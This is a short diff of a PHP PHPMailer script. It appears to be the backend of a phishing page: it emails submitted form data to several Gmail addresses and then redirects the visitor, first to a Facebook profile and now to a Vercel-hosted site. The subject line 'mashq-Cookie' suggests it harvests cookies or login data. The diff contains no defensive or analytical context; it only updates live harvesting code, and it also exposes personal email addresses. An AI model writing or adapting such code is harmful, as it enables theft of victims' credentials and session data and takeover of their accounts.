@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://facebook.com/profile.php");
+header("Location:https://in-y-is.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -36,15 +36,15 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->setFrom('rnxsxnnxnx@gmail.com', 'PROFESSOR');
-        $mail->addAddress('nizamaniallahabad@gmail.com');
-         $mail->addAddress('mahboobalinizamani@gmail.com');
+        $mail->addAddress('mahboobalinizamani@gmail.com');
          $mail->addAddress('rnxsxnnxnx@gmail.com');
+       
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'dhaha';
+        $mail->Subject = 'mashq-Cookie';
         $mail->Body = $emailBody; // Set the email body using the collected form data
         
         // Send email
